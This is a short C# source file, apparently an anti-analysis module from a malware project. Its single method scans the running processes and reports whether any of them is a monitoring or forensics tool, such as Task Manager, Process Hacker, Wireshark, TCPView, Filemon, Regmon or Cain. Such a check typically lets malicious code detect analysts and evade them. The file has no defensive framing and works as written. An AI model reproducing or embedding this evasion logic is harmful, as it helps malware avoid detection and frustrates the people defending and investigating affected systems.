using System;
using System.Diagnostics;
using System.Linq;

namespace AntiAnalysis
{
    internal sealed class Processes
    {
        /// <summary>
        /// Returns true if a process is started from the list; otherwise, returns false
        /// </summary>
        public static bool Check()
        {
            Process[] running_process_list = Process.GetProcesses();
            string[] selected_process_list = new string[] {
                "taskmgr", "processhacker",
                "netstat", "netmon", "tcpview", "wireshark",
                "filemon", "regmon", "cain"
            };

            foreach (Process process in running_process_list)
                if (selected_process_list.Contains(process.ProcessName.ToLower()))
                    return true;
            return false;
        }

    }
}
